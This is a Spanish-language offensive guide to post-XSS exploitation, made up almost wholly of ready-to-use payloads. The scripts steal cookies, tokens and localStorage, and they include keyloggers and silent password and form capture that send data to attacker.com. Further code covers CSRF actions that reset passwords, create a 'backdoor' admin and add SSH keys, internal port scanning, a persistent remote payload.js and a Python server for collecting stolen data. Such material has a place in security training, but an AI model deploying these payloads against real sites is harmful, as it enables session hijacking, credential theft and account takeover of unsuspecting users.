# Exfiltración de Datos

Una vez confirmado el XSS, el siguiente paso es aprovechar la ejecución de código en el navegador de la víctima para extraer información sensible o realizar acciones en su nombre.

### Infraestructura del atacante

Para recibir datos exfiltrados necesitas un servidor accesible:

```bash
# Opción 1: Python simple HTTP server
python3 -m http.server 80
# Captura GET requests: /steal?c=...

# Opción 2: netcat
nc -lvnp 80

# Opción 3: Ngrok (expone localhost)
ngrok http 80
# Proporciona URL pública: https://abc123.ngrok.io

# Opción 4: Interactsh (más robusto)
interactsh-client
# URL: abc123.oast.fun

# Opción 5: XSS Hunter (todo en uno)
# https://xsshunter.trufflesecurity.com/
# Captura cookies, localStorage, DOM, screenshot, URL
```

### 1. Robo de Cookies (Session Hijacking)

```javascript
// Método 1: Redirección (más visible)
document.location = 'https://attacker.com/steal?c=' + document.cookie;

// Método 2: Imagen (silencioso, no redirige)
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);

// Método 3: fetch (moderno, silencioso)
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));

// Método 4: fetch POST (más datos, no aparece en URL)
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ cookie: document.cookie, url: location.href })
});

// Método 5: XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?c=' + document.cookie);
xhr.send();
```

#### Usar la cookie robada

```bash
# En Burp Repeater: reemplazar el valor de la cookie en la petición
Cookie: session=COOKIE_ROBADA

# En curl
curl -b "session=COOKIE_ROBADA" https://target.com/dashboard

# En el navegador: DevTools → Application → Cookies → editar valor
```

### 2. Robo de Tokens y Storage

```javascript
// localStorage completo
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({ localStorage: JSON.stringify(localStorage) })
});

// sessionStorage
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({ sessionStorage: JSON.stringify(sessionStorage) })
});

// Token JWT específico (común en SPAs)
var token = localStorage.getItem('token') || localStorage.getItem('jwt') || localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));

// Todo junto
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    title: document.title
  })
});
```

### 3. Keylogger

```javascript
// Keylogger básico
var keys = '';
document.addEventListener('keydown', function(e) {
  keys += e.key;
  // Enviar cada 30 teclas
  if (keys.length >= 30) {
    fetch('https://attacker.com/keys?k=' + encodeURIComponent(keys));
    keys = '';
  }
});

// Keylogger avanzado con contexto del campo
document.addEventListener('keydown', function(e) {
  var target = e.target;
  fetch('https://attacker.com/keys', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      key: e.key,
      field: target.name || target.id || target.type,
      url: window.location.href
    })
  });
});
```

### 4. Captura de Formularios

```javascript
// Interceptar submit de todos los formularios
document.querySelectorAll('form').forEach(function(form) {
  form.addEventListener('submit', function(e) {
    var data = new FormData(e.target);
    var obj = Object.fromEntries(data.entries());
    fetch('https://attacker.com/form', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({ formData: obj, url: location.href })
    });
    // No bloquear el submit para que la víctima no lo note
  });
});

// Capturar específicamente inputs de contraseña
document.querySelectorAll('input[type=password]').forEach(function(input) {
  input.addEventListener('change', function(e) {
    fetch('https://attacker.com/pass?p=' + encodeURIComponent(e.target.value));
  });
});
```

### 5. Capturar el DOM completo

```javascript
// Útil para Blind XSS donde no puedes ver la página
fetch('https://attacker.com/dom', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    url: window.location.href,
    title: document.title,
    dom: document.documentElement.innerHTML,
    cookie: document.cookie
  })
});

// Screenshot via html2canvas (si la librería está cargada)
html2canvas(document.body).then(function(canvas) {
  canvas.toBlob(function(blob) {
    var form = new FormData();
    form.append('screenshot', blob, 'screenshot.png');
    fetch('https://attacker.com/screenshot', { method: 'POST', mode: 'no-cors', body: form });
  });
});
```

### 6. CSRF via XSS (acciones en nombre de la víctima)

XSS bypass automáticamente las protecciones CSRF porque el JS se ejecuta desde el mismo origen.

```javascript
// Cambiar email del usuario (bypassing CSRF)
fetch('/account/change-email', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com'
}).then(r => r.text()).then(d => console.log(d));

// Primero obtener token CSRF, luego usarlo
fetch('/account/settings')
  .then(r => r.text())
  .then(function(html) {
    var csrf = (html.match(/name="csrf_token" value="([^"]+)"/) || [])[1];
    return fetch('/account/change-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'csrf_token=' + csrf + '&new_password=hacked123&confirm=hacked123'
    });
  });

// Crear usuario admin
fetch('/admin/users/create', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'backdoor', password: 'pass123', role: 'admin' })
});

// Añadir SSH key (si es un panel de servidor)
fetch('/settings/ssh-keys', {
  method: 'POST',
  body: 'key=ssh-rsa AAAAB3... attacker@evil.com'
});
```

### 7. Port Scanning de la red interna

```javascript
// Escanear puertos de localhost desde el navegador de la víctima
var ports = [21, 22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017];
ports.forEach(function(port) {
  var start = Date.now();
  fetch('http://127.0.0.1:' + port, { mode: 'no-cors' })
    .then(function() {
      fetch('https://attacker.com/open?port=' + port + '&time=' + (Date.now()-start));
    })
    .catch(function() {
      // Puerto cerrado o error de CORS — medir tiempo igual puede dar info
    });
});

// Escanear hosts de la red interna
['192.168.1.1','192.168.0.1','10.0.0.1','172.16.0.1'].forEach(function(host) {
  fetch('http://' + host, { mode: 'no-cors', signal: AbortSignal.timeout(500) })
    .then(function() {
      fetch('https://attacker.com/alive?host=' + host);
    });
});
```

### 8. Payload persistente (si el XSS es stored)

```javascript
// Cargar script externo (más fácil de actualizar que inline)
<script src="https://attacker.com/payload.js"></script>

// Contenido de payload.js en el servidor del atacante:
// Puede actualizarse sin modificar la inyección almacenada
(function() {
  // 1. Robar cookie
  new Image().src = 'https://attacker.com/c?' + document.cookie;
  
  // 2. Robar tokens
  new Image().src = 'https://attacker.com/t?' + encodeURIComponent(localStorage.getItem('token'));
  
  // 3. Instalar keylogger
  document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/k?k=' + e.key);
  });
})();
```

### Servidor de recepción simple (Python)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        print(f"\n[+] GET {self.path}")
        for k, v in params.items():
            print(f"    {k}: {v[0]}")
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        print(f"\n[+] POST {self.path}")
        try:
            print(json.dumps(json.loads(body), indent=2))
        except:
            print(body)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

    def log_message(self, *args):
        pass  # Silenciar logs por defecto

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

> `mode: 'no-cors'` en fetch permite hacer peticiones cross-origin sin necesitar cabeceras CORS — aunque no puedes leer la respuesta, el servidor del atacante la recibe.

> Para stored XSS, cargar un script externo (`<script src=...>`) es más flexible que un payload inline porque puedes cambiar el payload sin tocar la inyección almacenada.

> Las cookies con flag `HttpOnly` **no son accesibles via `document.cookie`**. En ese caso, el impacto real es mediante CSRF via XSS (acciones en nombre del usuario) en lugar de session hijacking directo.
